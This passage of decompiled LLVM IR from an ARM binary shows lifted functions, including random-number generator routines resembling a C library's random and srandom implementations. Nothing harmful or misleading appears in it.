  uselistorder i32 %v3_fc90, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_fc54, { 1, 0 }
  uselistorder i32 %v3_fc34, { 2, 3, 1, 0 }
  uselistorder i32 %v0_fc80, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_fc78, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @function_fbe0, { 1, 0 }
  uselistorder i32 ()* @function_fc00, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fd00, { 1, 0 }
  uselistorder label %dec_label_pc_fce8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fcdc, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_fc28, { 1, 0 }
}

define i32 @function_fd08() local_unnamed_addr {
dec_label_pc_fd24.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_fd08 = ptrtoint i32* %stack_var_-268 to i32
  %v1_fd18 = call i32 @function_10838()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_fd24 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_fd24

dec_label_pc_fd24:                                ; preds = %dec_label_pc_fd24.lr.ph, %dec_label_pc_fd24
  %v1_fd28 = phi i32 [ 31, %dec_label_pc_fd24.lr.ph ], [ %v1_fd34, %dec_label_pc_fd24 ]
  %v4_fd28 = mul i32 %v1_fd28, 4
  %v5_fd28 = add i32 %v4_fd28, %v2_fd24
  %v2_fd30 = add i32 %v5_fd28, -128
  %v3_fd30 = inttoptr i32 %v2_fd30 to i32*
  store i32 0, i32* %v3_fd30, align 4
  %v0_fd34 = load i32, i32* %r1.global-to-local, align 4
  %v1_fd34 = add i32 %v0_fd34, -1
  store i32 %v1_fd34, i32* %r1.global-to-local, align 4
  %v6_fd34 = icmp slt i32 %v1_fd34, 0
  br i1 %v6_fd34, label %dec_label_pc_fd3c, label %dec_label_pc_fd24

dec_label_pc_fd3c:                                ; preds = %dec_label_pc_fd24
  %v2_fd3c = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_fd3c, i32* @r4, align 4
  store i32 6, i32* %r1.global-to-local, align 4
  %v2_fd48 = call i32 @function_13360(i32 %v2_fd3c, i32 6)
  %v2_fd4c = icmp eq i32 %v2_fd48, 0
  br i1 %v2_fd4c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_fd3c
  store i32 %v2_fd3c, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_fd3c, %bb
  store i32 64864, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_fd4c, i32 ptrtoint (i32* @global_var_10f84.444 to i32))
  %v2_fd64 = load i32, i32* @global_var_1aaa8.446, align 4
  %v2_fd68 = icmp eq i32 %v2_fd64, 0
  br i1 %v2_fd68, label %dec_label_pc_fd70, label %dec_label_pc_fda0

dec_label_pc_fd70:                                ; preds = %.thread1
  store i32 1, i32* @global_var_1aaa8.446, align 4
  br label %dec_label_pc_fd78

dec_label_pc_fd78:                                ; preds = %dec_label_pc_fdf0, %dec_label_pc_fd70
  %v1_fd84 = call i32 @function_10838()
  %v1_fd8c = call i32 @function_13324(i32 6)
  store i32 64928, i32* @lr, align 4
  %v1_fd9c = call i32 @function_10838()
  %v2_fda4.pre = load i32, i32* @global_var_1aaa8.446, align 4
  br label %dec_label_pc_fda0

dec_label_pc_fda0:                                ; preds = %.thread1, %dec_label_pc_fd78
  %v0_fe14 = phi i32 [ %v2_fd64, %.thread1 ], [ %v2_fda4.pre, %dec_label_pc_fd78 ]
  store i32 ptrtoint (i32* @global_var_1aaa8.446 to i32), i32* %ip.global-to-local, align 4
  %v7_fda8 = icmp eq i32 %v0_fe14, 1
  br i1 %v7_fda8, label %dec_label_pc_fdd8.lr.ph, label %dec_label_pc_fe0c

dec_label_pc_fdd8.lr.ph:                          ; preds = %dec_label_pc_fda0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_1aaa8.446, align 4
  %v2_fdc4 = bitcast i32* %stack_var_-268 to i8*
  %v3_fdc4 = call i32 @function_ec20(i8* %v2_fdc4, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fdd8

dec_label_pc_fdd8:                                ; preds = %dec_label_pc_fdd8.lr.ph, %dec_label_pc_fdd8
  %v1_fddc = phi i32 [ 31, %dec_label_pc_fdd8.lr.ph ], [ %v1_fde8, %dec_label_pc_fdd8 ]
  %v4_fddc = mul i32 %v1_fddc, 4
  %v5_fddc = add i32 %v4_fddc, %v2_fd24
  %v2_fde4 = add i32 %v5_fddc, -264
  %v3_fde4 = inttoptr i32 %v2_fde4 to i32*
  store i32 -1, i32* %v3_fde4, align 4
  %v0_fde8 = load i32, i32* %r1.global-to-local, align 4
  %v1_fde8 = add i32 %v0_fde8, -1
  store i32 %v1_fde8, i32* %r1.global-to-local, align 4
  %v6_fde8 = icmp slt i32 %v1_fde8, 0
  br i1 %v6_fde8, label %dec_label_pc_fdf0, label %dec_label_pc_fdd8

dec_label_pc_fdf0:                                ; preds = %dec_label_pc_fdd8
  store i32 %v2_fd08, i32* %r1.global-to-local, align 4
  %v4_fe04 = call i32 @function_10b24(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_fd78

dec_label_pc_fe0c:                                ; preds = %dec_label_pc_fda0
  %v7_fe0c = icmp eq i32 %v0_fe14, 2
  br i1 %v7_fe0c, label %dec_label_pc_fe14, label %dec_label_pc_fe20

dec_label_pc_fe14:                                ; preds = %dec_label_pc_fe0c
  store i32 3, i32* @global_var_1aaa8.446, align 4
  %v0_fe1c = call i32 @function_fd08()
  %v2_fe20.pre = load i32, i32* @global_var_1aaa8.446, align 4
  br label %dec_label_pc_fe20

dec_label_pc_fe20:                                ; preds = %dec_label_pc_fe0c, %dec_label_pc_fe14
  %v1_fe28 = phi i32 [ %v0_fe14, %dec_label_pc_fe0c ], [ %v2_fe20.pre, %dec_label_pc_fe14 ]
  %v7_fe24 = icmp eq i32 %v1_fe28, 3
  br i1 %v7_fe24, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_fe20
  %v2_fe30 = load i32, i32* %ip.global-to-local, align 4
  %v3_fe30 = inttoptr i32 %v2_fe30 to i32*
  store i32 4, i32* %v3_fe30, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_fe20, %bb27
  call void @__pseudo_cond_branch(i1 %v7_fe24, i32 ptrtoint (i32* @global_var_10d38.448 to i32))
  br label %dec_label_pc_fe38

dec_label_pc_fe38:                                ; preds = %dec_label_pc_fe38, %.thread3
  %v0_fe38 = call i32 @function_fd08()
  br label %dec_label_pc_fe38

; uselistorder directives
  uselistorder i32 %v1_fde8, { 2, 1, 0 }
  uselistorder i32 %v1_fd34, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 5, 6, 7, 9, 8, 2 }
  uselistorder i32* @global_var_1aaa8.446, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_fe20, { 1, 0 }
  uselistorder label %dec_label_pc_fdd8, { 1, 0 }
  uselistorder label %dec_label_pc_fda0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_fd24, { 1, 0 }
}

define i32 @function_fe50() local_unnamed_addr {
dec_label_pc_fe50:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_fe54 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_18354.450 to i32), i32* @r4, align 4
  %v2_fe5c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_fe5c, i32* @r0, align 4
  %v1_fe74 = call i32 @function_10840()
  %v1_fe84 = call i32 @function_10838()
  %v2_fe88 = ptrtoint i32* %stack_var_-16 to i32
  %v3_fe90 = call i32 @function_10130(i32* inttoptr (i32 99180 to i32*), i32 %v2_fe88)
  store i32 %v2_fe5c, i32* @r0, align 4
  store i32 65192, i32* @lr, align 4
  %v1_fea4 = call i32 @function_10840()
  %v3_fea8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_fe54, i32* @r4, align 4
  ret i32 %v3_fea8
}

define i32 @function_fff4(i32 %arg1) local_unnamed_addr {
dec_label_pc_fff4:
  %stack_var_-32 = alloca i32, align 4
  %v3_fff4 = load i32, i32* @r4, align 4
  %v9_fff4 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_18354.450 to i32), i32* @r4, align 4
  %v2_fffc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_fffc, i32* @r0, align 4
  %v1_10018 = call i32 @function_10840()
  store i32 65580, i32* @lr, align 4
  %v1_10028 = call i32 @function_10838()
  %v0_1002c = load i32, i32* @r6, align 4
  store i32 %v0_1002c, i32* @r0, align 4
  %v2_10034 = inttoptr i32 %v0_1002c to i32*
  %v3_10034 = call i32 @function_101c0(i32* %v2_10034, i32 ptrtoint (i32* @global_var_1836c to i32))
  store i32 %v2_fffc, i32* @r0, align 4
  %v1_1004c = call i32 @function_10840()
  store i32 %v3_fff4, i32* @r4, align 4
  store i32 %v9_fff4, i32* @r6, align 4
  ret i32 %v1_1004c
}

define i32 @function_10130(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10130:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_10130 = add i32 %tmp, 12
  %v2_10130 = inttoptr i32 %v1_10130 to i32*
  %v3_10130 = load i32, i32* %v2_10130, align 4
  store i32 %v3_10130, i32* %r3.global-to-local, align 4
  %v2_10134 = icmp eq i32 %v3_10130, 0
  %v3_10138 = load i32, i32* @r4, align 4
  store i32 %v3_10138, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10144 = add i32 %tmp, 8
  %v2_10144 = inttoptr i32 %v1_10144 to i32*
  %v3_10144 = load i32, i32* %v2_10144, align 4
  store i32 %v3_10144, i32* %lr.global-to-local, align 4
  br i1 %v2_10134, label %dec_label_pc_1014c, label %dec_label_pc_10170

dec_label_pc_1014c:                               ; preds = %dec_label_pc_10130
  %v1_1014c = inttoptr i32 %v3_10144 to i32*
  %v2_1014c = load i32, i32* %v1_1014c, align 4
  store i32 %v2_1014c, i32* %r2.global-to-local, align 4
  %v2_10154 = mul i32 %v2_1014c, 1103515245
  %v1_1015c = add i32 %v2_10154, 12345
  %tmp10 = bitcast i32 %v1_1015c to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_10160 = bitcast float %tmp11 to i32
  store i32 %v1_10160, i32* %r3.global-to-local, align 4
  store i32 %v1_10160, i32* %v1_1014c, align 4
  %v0_10168 = load i32, i32* %r3.global-to-local, align 4
  %v2_10168 = inttoptr i32 %arg2 to i32*
  store i32 %v0_10168, i32* %v2_10168, align 4
  br label %dec_label_pc_101b4

dec_label_pc_10170:                               ; preds = %dec_label_pc_10130
  %v2_10170 = load i32, i32* %arg1, align 4
  store i32 %v2_10170, i32* %r2.global-to-local, align 4
  %v1_10174 = add i32 %tmp, 4
  %v2_10174 = inttoptr i32 %v1_10174 to i32*
  %v3_10174 = load i32, i32* %v2_10174, align 4
  store i32 %v3_10174, i32* %r0.global-to-local, align 4
  %v1_10178 = inttoptr i32 %v2_10170 to i32*
  %v2_10178 = load i32, i32* %v1_10178, align 4
  store i32 %v2_10178, i32* %r3.global-to-local, align 4
  %v1_1017c = inttoptr i32 %v3_10174 to i32*
  %v2_1017c = load i32, i32* %v1_1017c, align 4
  %v4_1017c = add i32 %v3_10174, 4
  store i32 %v4_1017c, i32* %r0.global-to-local, align 4
  %v2_10180 = add i32 %v2_1017c, %v2_10178
  store i32 %v2_10180, i32* %r3.global-to-local, align 4
  store i32 %v2_10180, i32* %v1_10178, align 4
  %v3_10184 = load i32, i32* %r2.global-to-local, align 4
  %v4_10184 = add i32 %v3_10184, 4
  store i32 %v4_10184, i32* %r2.global-to-local, align 4
  %v0_10188 = load i32, i32* %ip.global-to-local, align 4
  %v1_10188 = add i32 %v0_10188, 24
  %v2_10188 = inttoptr i32 %v1_10188 to i32*
  %v3_10188 = load i32, i32* %v2_10188, align 4
  store i32 %v3_10188, i32* %r4.global-to-local, align 4
  %v0_1018c = load i32, i32* %r3.global-to-local, align 4
  %v3_1018c = udiv i32 %v0_1018c, 2
  store i32 %v3_1018c, i32* %r3.global-to-local, align 4
  %v3_10190 = icmp ult i32 %v4_10184, %v3_10188
  %v1_10194 = load i32, i32* %r5.global-to-local, align 4
  %v2_10194 = inttoptr i32 %v1_10194 to i32*
  store i32 %v3_1018c, i32* %v2_10194, align 4
  br i1 %v3_10190, label %dec_label_pc_101a4, label %bb

bb:                                               ; preds = %dec_label_pc_10170
  %v1_10198 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_10198, i32* %r2.global-to-local, align 4
  %v0_1019c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1019c, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_101a4:                               ; preds = %dec_label_pc_10170
  %v0_1019c1 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1019c1, i32* %r3.global-to-local, align 4
  %v1_101a4 = load i32, i32* %r4.global-to-local, align 4
  %v3_101a4 = icmp ult i32 %v0_1019c1, %v1_101a4
  br i1 %v3_101a4, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_101a4
  store i32 %v0_1019c1, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_101a4
  %v1_101ac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_101ac, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_101b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_101b0 = inttoptr i32 %v0_101b0 to i32*
  %v2_101b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_101b0, i32* %v1_101b0, align 4
  %v3_101b0 = add i32 %v0_101b0, 4
  %v4_101b0 = inttoptr i32 %v3_101b0 to i32*
  %v5_101b0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_101b0, i32* %v4_101b0, align 4
  br label %dec_label_pc_101b4

dec_label_pc_101b4:                               ; preds = %dec_label_pc_1014c, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_101b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_101b8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1019c1, { 1, 0, 2 }
  uselistorder i32 %v3_1018c, { 1, 0 }
  uselistorder i32 %v1_10160, { 1, 0 }
  uselistorder i32 %tmp, { 3, 1, 0, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_101b4, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @function_101c0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_101c0:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_101c0 = load i32, i32* @r4, align 4
  store i32 %v3_101c0, i32* %stack_var_-32, align 4
  %v6_101c0 = load i32, i32* @r5, align 4
  %v1_101c4 = add i32 %tmp, 12
  %v2_101c4 = inttoptr i32 %v1_101c4 to i32*
  %v3_101c4 = load i32, i32* %v2_101c4, align 4
  %v2_101cc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp22 = icmp ugt i32 %v3_101c4, 4
  br i1 %tmp22, label %.dec_label_pc_10278_crit_edge, label %dec_label_pc_101dc

.dec_label_pc_10278_crit_edge:                    ; preds = %dec_label_pc_101c0
  br label %dec_label_pc_10278

dec_label_pc_101dc:                               ; preds = %dec_label_pc_101c0
  %v0_101dc = load i32, i32* @r0, align 4
  %v2_101dc = icmp eq i32 %v0_101dc, 0
  %v1_101e0 = add i32 %tmp, 8
  %v2_101e0 = inttoptr i32 %v1_101e0 to i32*
  %v3_101e0 = load i32, i32* %v2_101e0, align 4
  store i32 %v3_101e0, i32* %r7.global-to-local, align 4
  br i1 %v2_101dc, label %bb, label %bb19

bb:                                               ; preds = %dec_label_pc_101dc
  store i32 1, i32* @r0, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_101dc, %bb
  %v0_101ec = phi i32 [ %v0_101dc, %dec_label_pc_101dc ], [ 1, %bb ]
  %v2_101e8 = icmp eq i32 %v3_101c4, 0
  %v2_101ec = inttoptr i32 %v3_101e0 to i32*
  store i32 %v0_101ec, i32* %v2_101ec, align 4
  br i1 %v2_101e8, label %dec_label_pc_10274, label %dec_label_pc_101f4

dec_label_pc_101f4:                               ; preds = %bb19
  %v1_101f4 = add i32 %tmp, 16
  %v2_101f4 = inttoptr i32 %v1_101f4 to i32*
  %v3_101f4 = load i32, i32* %v2_101f4, align 4
  store i32 %v3_101f4, i32* %sb.global-to-local, align 4
  %v0_101f8 = load i32, i32* @r0, align 4
  store i32 %v0_101f8, i32* @r5, align 4
  %v0_101fc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_101fc, i32* %sl.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10234

dec_label_pc_10208:                               ; preds = %dec_label_pc_10234
  %v2_10208 = call i32 @function_c930(i32 %v0_10238, i32 127773)
  store i32 127773, i32* @r1, align 4
  %v2_10214 = mul i32 %v2_10208, 16807
  %v0_10218 = load i32, i32* @r5, align 4
  store i32 %v0_10218, i32* @r0, align 4
  %v0_1021c = call i32 @function_14b44()
  %tmp23 = mul i32 %v0_1021c, -2836
  %v2_10228 = add i32 %v2_10214, %tmp23
  %v8_10228 = icmp slt i32 %v2_10228, 0
  br i1 %v8_10228, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_10208
  %v2_1022c = add i32 %v2_10228, 2147483647
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_10208, %bb20
  %storemerge = phi i32 [ %v2_1022c, %bb20 ], [ %v2_10228, %dec_label_pc_10208 ]
  %v0_10230 = phi i32 [ %v2_1022c, %bb20 ], [ %v2_10228, %dec_label_pc_10208 ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_10230 = load i32, i32* %sl.global-to-local, align 4
  %v2_10230 = add i32 %v1_10230, 4
  %v3_10230 = inttoptr i32 %v2_10230 to i32*
  store i32 %v0_10230, i32* %v3_10230, align 4
  %v4_10230 = load i32, i32* %sl.global-to-local, align 4
  %v5_10230 = add i32 %v4_10230, 4
  store i32 %v5_10230, i32* %sl.global-to-local, align 4
  %v0_10234.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10234.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_10238.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10234

dec_label_pc_10234:                               ; preds = %dec_label_pc_101f4, %bb21
  %v0_10238 = phi i32 [ %v0_101f8, %dec_label_pc_101f4 ], [ %v0_10238.pre, %bb21 ]
  %v0_1024c = phi i32 [ %v3_101f4, %dec_label_pc_101f4 ], [ %v1_10234.pre, %bb21 ]
  %v0_10240 = phi i32 [ 1, %dec_label_pc_101f4 ], [ %v0_10234.pre, %bb21 ]
  %v1_10240 = add i32 %v0_10240, 1
  store i32 %v1_10240, i32* %r8.global-to-local, align 4
  %v5_10244 = icmp slt i32 %v0_10240, %v0_1024c
  br i1 %v5_10244, label %dec_label_pc_10208, label %dec_label_pc_10248

dec_label_pc_10248:                               ; preds = %dec_label_pc_10234
  %v2_1024c = mul i32 %v0_1024c, 10
  store i32 %v2_1024c, i32* @r4, align 4
  %v0_10250 = load i32, i32* %r6.global-to-local, align 4
  %v1_10250 = add i32 %v0_10250, 20
  %v2_10250 = inttoptr i32 %v1_10250 to i32*
  %v3_10250 = load i32, i32* %v2_10250, align 4
  %v0_10254 = load i32, i32* %r7.global-to-local, align 4
  %v4_10254 = mul i32 %v3_10250, 4
  %v5_10254 = add i32 %v0_10254, %v4_10254
  %v1_10258 = inttoptr i32 %v0_10250 to i32*
  store i32 %v5_10254, i32* %v1_10258, align 4
  %v3_10258 = add i32 %v0_10250, 4
  %v4_10258 = inttoptr i32 %v3_10258 to i32*
  %v5_10258 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_10258, i32* %v4_10258, align 4
  br label %dec_label_pc_10264

dec_label_pc_10260:                               ; preds = %dec_label_pc_10264
  %v0_10268 = load i32, i32* %r6.global-to-local, align 4
  %v2_10260 = inttoptr i32 %v0_10268 to i32*
  %v3_10260 = call i32 @function_10130(i32* %v2_10260, i32 %v2_101cc)
  br label %dec_label_pc_10264

dec_label_pc_10264:                               ; preds = %dec_label_pc_10248, %dec_label_pc_10260
  %v0_10264 = load i32, i32* @r4, align 4
  %v1_10264 = add i32 %v0_10264, -1
  store i32 %v1_10264, i32* @r4, align 4
  %v6_10264 = icmp slt i32 %v1_10264, 0
  br i1 %v6_10264, label %dec_label_pc_10274, label %dec_label_pc_10260

dec_label_pc_10274:                               ; preds = %dec_label_pc_10264, %bb19
  %v2_1027c.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_10278

dec_label_pc_10278:                               ; preds = %.dec_label_pc_10278_crit_edge, %dec_label_pc_10274
  %v2_1027c = phi i32 [ %v3_101c0, %.dec_label_pc_10278_crit_edge ], [ %v2_1027c.pre, %dec_label_pc_10274 ]
  %v26_1027c = phi i32 [ -1, %.dec_label_pc_10278_crit_edge ], [ 0, %dec_label_pc_10274 ]
  store i32 %v2_1027c, i32* @r4, align 4
  store i32 %v6_101c0, i32* @r5, align 4
  ret i32 %v26_1027c

; uselistorder directives
  uselistorder i32 %v1_10264, { 1, 0 }
  uselistorder i32 %v0_10250, { 1, 0, 2 }
  uselistorder i32 %v0_10240, { 1, 0 }
  uselistorder i32 %v2_10228, { 0, 3, 2, 1 }
  uselistorder i32 %v3_101c4, { 1, 0 }
  uselistorder i32 %tmp, { 3, 2, 0, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_10278, { 1, 0 }
  uselistorder label %dec_label_pc_10264, { 1, 0 }
  uselistorder label %dec_label_pc_10234, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_10280(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10280:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_10280 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10280, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_10280
  %v1_10280 = load i32, i32* @r0, align 4
  %v2_10280 = load i32, i32* @r7, align 4
  %v5_10280 = udiv i32 %v2_10280, 8
  %v6_10280 = and i32 %v5_10280, %v1_10280
  store i32 %v6_10280, i32* @r4, align 4
  %v2_10284 = load i32, i32* @sp, align 4
  %v8_10284 = shl i32 %v2_10284, %arg4
  %v9_10284 = and i32 %v8_10284, %tmp
  call void @__pseudo_branch(i32 %v9_10284)
  %v0_10288.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10288.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v1_10288 = load i32, i32* @r0, align 4
  %v2_10288 = load i32, i32* @r4, align 4
  %v3_10288 = load i32, i32* @fp, align 4
  %v8_10288 = shl i32 %v2_10288, %v3_10288
  %v9_10288 = and i32 %v8_10288, %v1_10288
  store i32 %v9_10288, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10280, %.thread, %bb
  %v3_10290 = load i32, i32* @r4, align 4
  store i32 %v3_10290, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg4, i32* @r5, align 4
  %tmp31 = icmp ult i32 %arg3, 128
  br i1 %tmp31, label %dec_label_pc_102b0, label %dec_label_pc_102a0

dec_label_pc_102a0:                               ; preds = %.thread1
  %v2_102a0 = icmp ugt i32 %arg3, 254
  %v7_102a0 = icmp eq i32 %arg3, 255
  %v2_102a4 = xor i1 %v7_102a0, true
  %v3_102a4 = and i1 %v2_102a0, %v2_102a4
  br i1 %v3_102a4, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_102a0
  store i32 4, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_102a0, %bb22
  %v1_102d89 = phi i32 [ %v3_10290, %dec_label_pc_102a0 ], [ 4, %bb22 ]
  %v2_102a8 = xor i1 %v2_102a0, true
  %v3_102a8 = or i1 %v7_102a0, %v2_102a8
  br i1 %v3_102a8, label %bb24, label %bb28

bb24:                                             ; preds = %bb23
  store i32 3, i32* @r4, align 4
  br label %bb28

dec_label_pc_102b0:                               ; preds = %.thread1
  %tmp32 = icmp ugt i32 %arg3, 31
  br i1 %tmp32, label %dec_label_pc_102c8, label %dec_label_pc_102b8

dec_label_pc_102b8:                               ; preds = %dec_label_pc_102b0
  %tmp33 = icmp ugt i32 %arg3, 7
  br i1 %tmp33, label %.thread12, label %dec_label_pc_10334

.thread12:                                        ; preds = %dec_label_pc_102b8
  store i32 0, i32* @r4, align 4
  br label %bb28

dec_label_pc_102c8:                               ; preds = %dec_label_pc_102b0
  %v2_102c8 = icmp ugt i32 %arg3, 62
  %v7_102c8 = icmp eq i32 %arg3, 63
  %v2_102cc = xor i1 %v7_102c8, true
  %v3_102cc = and i1 %v2_102c8, %v2_102cc
  br i1 %v3_102cc, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_102c8
  store i32 2, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_102c8, %bb25
  %v1_102d88 = phi i32 [ %v3_10290, %dec_label_pc_102c8 ], [ 2, %bb25 ]
  %v2_102d0 = xor i1 %v2_102c8, true
  %v3_102d0 = or i1 %v7_102c8, %v2_102d0
  br i1 %v3_102d0, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  store i32 1, i32* @r4, align 4
  br label %bb28

bb28:                                             ; preds = %.thread12, %bb24, %bb23, %bb26, %bb27
  %v1_102e0 = phi i32 [ 3, %bb24 ], [ %v1_102d89, %bb23 ], [ %v1_102d88, %bb26 ], [ 1, %bb27 ], [ 0, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_17580.469 to i32), i32* %r2.global-to-local, align 4
  %v4_102d8 = mul i32 %v1_102e0, 4
  %v5_102d8 = add i32 %v4_102d8, ptrtoint (i32* @global_var_17580.469 to i32)
  store i32 %v5_102d8, i32* %r3.global-to-local, align 4
  %v1_102dc = add i32 %v4_102d8, add (i32 ptrtoint (i32* @global_var_17580.469 to i32), i32 20)
  %v2_102dc = inttoptr i32 %v1_102dc to i32*
  %v3_102dc = load i32, i32* %v2_102dc, align 4
  store i32 %v3_102dc, i32* %r1.global-to-local, align 4
  %v6_102e0 = inttoptr i32 %v5_102d8 to i32*
  %v7_102e0 = load i32, i32* %v6_102e0, align 4
  store i32 %v7_102e0, i32* %r2.global-to-local, align 4
  %v1_102e4 = add i32 %tmp, 4
  store i32 %v1_102e4, i32* @r6, align 4
  %v4_102e8 = mul i32 %v3_102dc, 4
  %v5_102e8 = add i32 %v4_102e8, %v1_102e4
  store i32 %v5_102e8, i32* %r3.global-to-local, align 4
  %v2_102ec = add i32 %arg4, 24
  %v3_102ec = inttoptr i32 %v2_102ec to i32*
  store i32 %v5_102e8, i32* %v3_102ec, align 4
  %v0_102f0 = load i32, i32* %r2.global-to-local, align 4
